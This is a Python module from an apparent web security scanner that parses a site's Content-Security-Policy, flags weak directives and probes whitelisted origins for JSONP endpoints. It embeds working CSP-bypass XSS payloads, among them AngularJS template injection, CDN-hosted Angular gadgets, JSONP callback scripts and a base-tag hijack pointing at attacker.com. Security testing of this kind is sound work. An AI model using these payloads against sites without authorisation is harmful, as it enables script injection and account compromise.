import re
from typing import Dict, List, Set, Optional
from urllib.parse import urlparse, urljoin
from modules.base import BaseModule


class CspModule(BaseModule):
    name = "csp"
    description = "Content Security Policy Analyzer"
    
    dangerous_directives = {
        "unsafe-inline": "CRITICAL",
        "unsafe-eval": "CRITICAL", 
        "unsafe-hashes": "HIGH",
        "data:": "MEDIUM",
        "blob:": "MEDIUM",
        "*": "CRITICAL",
        "http:": "MEDIUM",
    }
    
    bypassable_cdns = [
        "cdnjs.cloudflare.com",
        "cdn.jsdelivr.net",
        "unpkg.com",
        "ajax.googleapis.com",
        "code.jquery.com",
        "stackpath.bootstrapcdn.com",
        "maxcdn.bootstrapcdn.com",
        "cdn.bootcss.com",
        "lib.baomitu.com",
        "ajax.aspnetcdn.com",
        "cdn.rawgit.com",
        "raw.githubusercontent.com",
        "gitcdn.xyz",
        "gitcdn.link",
        "combinatronics.com",
        "cdn.statically.io",
    ]
    
    jsonp_endpoints = [
        "/callback",
        "/jsonp",
        "/api",
        "callback=",
        "jsonp=",
        "cb=",
    ]
    
    angular_versions = {
        "1.0": "angular payload v1.0.x",
        "1.1": "angular payload v1.1.x",
        "1.2": "angular payload v1.2.x",
        "1.3": "angular payload v1.3.x",
        "1.4": "angular payload v1.4.x",
        "1.5": "angular payload v1.5.x",
        "1.6": "angular payload v1.6.x",
    }
    
    async def scan(self, target):
        self.findings = []
        self.csp_policy: Dict[str, List[str]] = {}
        self.bypasses: List[Dict] = []
        self.whitelisted_origins: Set[str] = set()
        self.current_origin: Optional[str] = None
        
        parsed = urlparse(target)
        self.current_origin = f"{parsed.scheme}://{parsed.netloc}"
        base_url = urljoin(target, "/")
        
        await self._fetch_csp(base_url)
        
        if self.csp_policy:
            self._analyze_script_src()
            self._analyze_default_src()
            self._analyze_style_src()
            self._analyze_base_uri()
            self._analyze_object_src()
            self._analyze_frame_ancestors()
            await self._find_jsonp_bypasses(target)
            await self._find_angular_bypasses(target)
            self._generate_bypass_payloads()
        else:
            self.add_finding(
                "MEDIUM",
                "No Content-Security-Policy Header",
                url=target,
                evidence="Missing CSP allows unrestricted script execution"
            )
        
        return self.findings
    
    async def _fetch_csp(self, target: str):
        resp = await self.http.get(target)
        
        if not resp.get("status"):
            return
        
        headers = {k.lower(): v for k, v in resp.get("headers", {}).items()}
        
        csp_header = headers.get("content-security-policy", "")
        csp_ro_header = headers.get("content-security-policy-report-only", "")
        
        html = resp.get("text", "")
        meta_csp = re.search(r'<meta[^>]*http-equiv=["\']Content-Security-Policy["\'][^>]*content=["\']([^"\']+)["\']', html, re.I)
        
        csp_value = csp_header or csp_ro_header
        if not csp_value and meta_csp:
            csp_value = meta_csp.group(1)
        
        if csp_value:
            self._parse_csp(csp_value)
            
            if csp_ro_header and not csp_header:
                self.add_finding(
                    "MEDIUM",
                    "CSP in Report-Only Mode",
                    url=target,
                    evidence="CSP is not enforced, only reported"
                )
    
    def _parse_csp(self, csp: str):
        directives = csp.split(";")
        
        for directive in directives:
            directive = directive.strip()
            if not directive:
                continue
            
            parts = directive.split()
            if len(parts) >= 1:
                name = parts[0].lower()
                values = parts[1:] if len(parts) > 1 else []
                self.csp_policy[name] = values
    
    def _analyze_script_src(self):
        script_src = self.csp_policy.get("script-src", [])
        default_src = self.csp_policy.get("default-src", [])
        
        sources = script_src or default_src
        
        for source in sources:
            source_lower = source.lower().strip("'")
            
            if source_lower in self.dangerous_directives:
                severity = self.dangerous_directives[source_lower]
                
                self.add_finding(
                    severity,
                    f"Dangerous script-src: {source}",
                    evidence=f"Allows XSS via {source}"
                )
                
                if source_lower == "unsafe-inline":
                    self.bypasses.append({
                        "type": "unsafe-inline",
                        "payload": "<script>alert(document.domain)</script>",
                    })
                elif source_lower == "unsafe-eval":
                    self.bypasses.append({
                        "type": "unsafe-eval",
                        "payload": "eval('alert(document.domain)')",
                    })
            
            for cdn in self.bypassable_cdns:
                if cdn in source_lower:
                    self.add_finding(
                        "HIGH",
                        f"Bypassable CDN in script-src: {cdn}",
                        evidence="CDN may host exploitable scripts"
                    )
                    
                    self.bypasses.append({
                        "type": "cdn_bypass",
                        "cdn": cdn,
                        "payload": self._get_cdn_bypass_payload(cdn),
                    })
    
    def _analyze_default_src(self):
        default_src = self.csp_policy.get("default-src", [])
        
        if not default_src:
            if not self.csp_policy.get("script-src"):
                self.add_finding(
                    "HIGH",
                    "No default-src or script-src",
                    evidence="Scripts can be loaded from any origin"
                )
        
        for source in default_src:
            if source == "*" or source == "'none'":
                if source == "*":
                    self.add_finding(
                        "CRITICAL",
                        "default-src allows all origins",
                        evidence="Wildcard default-src defeats CSP"
                    )
    
    def _analyze_style_src(self):
        style_src = self.csp_policy.get("style-src", [])
        
        for source in style_src:
            if "'unsafe-inline'" in source.lower():
                self.add_finding(
                    "MEDIUM",
                    "unsafe-inline in style-src",
                    evidence="May enable CSS injection attacks"
                )
    
    def _analyze_base_uri(self):
        base_uri = self.csp_policy.get("base-uri", [])
        
        if not base_uri:
            self.add_finding(
                "MEDIUM",
                "Missing base-uri directive",
                evidence="Base tag injection possible for relative URL hijacking"
            )
            
            self.bypasses.append({
                "type": "base_uri",
                "payload": "<base href='https://attacker.com/'>",
            })
    
    def _analyze_object_src(self):
        object_src = self.csp_policy.get("object-src", [])
        
        if not object_src:
            self.add_finding(
                "MEDIUM",
                "Missing object-src directive",
                evidence="Plugin content (Flash, Java) may be embeddable"
            )
    
    def _analyze_frame_ancestors(self):
        frame_ancestors = self.csp_policy.get("frame-ancestors", [])
        
        if not frame_ancestors:
            self.add_finding(
                "LOW",
                "Missing frame-ancestors directive",
                evidence="Clickjacking may be possible (check X-Frame-Options)"
            )
    
    async def _find_jsonp_bypasses(self, target: str):
        allowed_origins = []
        
        for directive in ["script-src", "default-src"]:
            for source in self.csp_policy.get(directive, []):
                if source.startswith("http") or "." in source:
                    allowed_origins.append(source)
        
        for origin in allowed_origins:
            if any(cdn in origin for cdn in self.bypassable_cdns):
                continue
            
            origin_url = origin if origin.startswith("http") else f"https://{origin}"
            
            for endpoint in self.jsonp_endpoints[:3]:
                test_url = f"{origin_url.rstrip('/')}{endpoint}"
                
                try:
                    resp = await self.http.get(f"{test_url}?callback=test", timeout=3)
                    
                    if resp.get("status") == 200:
                        body = resp.get("text", "")
                        
                        if "test(" in body or "test (" in body:
                            self.add_finding(
                                "HIGH",
                                f"JSONP Endpoint on Whitelisted Origin",
                                evidence=f"JSONP at {test_url} can bypass CSP"
                            )
                            
                            self.bypasses.append({
                                "type": "jsonp",
                                "url": test_url,
                                "payload": f"<script src='{test_url}?callback=alert'></script>",
                            })
                            break
                except:
                    pass
    
    async def _find_angular_bypasses(self, target: str):
        resp = await self.http.get(target)
        
        if not resp.get("status"):
            return
        
        html = resp.get("text", "")
        
        angular_patterns = [
            r'angular[.\-]?(\d+\.\d+)',
            r'angularjs[.\-]?(\d+\.\d+)',
            r'ng-app',
            r'ng-controller',
        ]
        
        for pattern in angular_patterns:
            if re.search(pattern, html, re.I):
                self.add_finding(
                    "HIGH",
                    "AngularJS Detected - Potential CSP Bypass",
                    evidence="AngularJS can bypass CSP via template injection"
                )
                
                self.bypasses.append({
                    "type": "angular",
                    "payload": "{{constructor.constructor('alert(1)')()}}",
                })
                break
    
    def _generate_bypass_payloads(self):
        if self.bypasses:
            self.add_finding(
                "HIGH",
                f"Found {len(self.bypasses)} CSP Bypass Techniques",
                evidence=f"Types: {', '.join(set(b['type'] for b in self.bypasses))}"
            )
    
    def _get_cdn_bypass_payload(self, cdn: str) -> str:
        cdn_payloads = {
            "cdnjs.cloudflare.com": "<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js'></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
            "cdn.jsdelivr.net": "<script src='https://cdn.jsdelivr.net/npm/angular@1.4.6/angular.min.js'></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
            "ajax.googleapis.com": "<script src='https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.min.js'></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
            "unpkg.com": "<script src='https://unpkg.com/angular@1.4.6/angular.js'></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
        }
        
        return cdn_payloads.get(cdn, f"<script src='https://{cdn}/path/to/exploit.js'></script>")
    
    def get_bypasses(self) -> List[Dict]:
        return self.bypasses
    
    def get_policy(self) -> Dict[str, List[str]]:
        return self.csp_policy
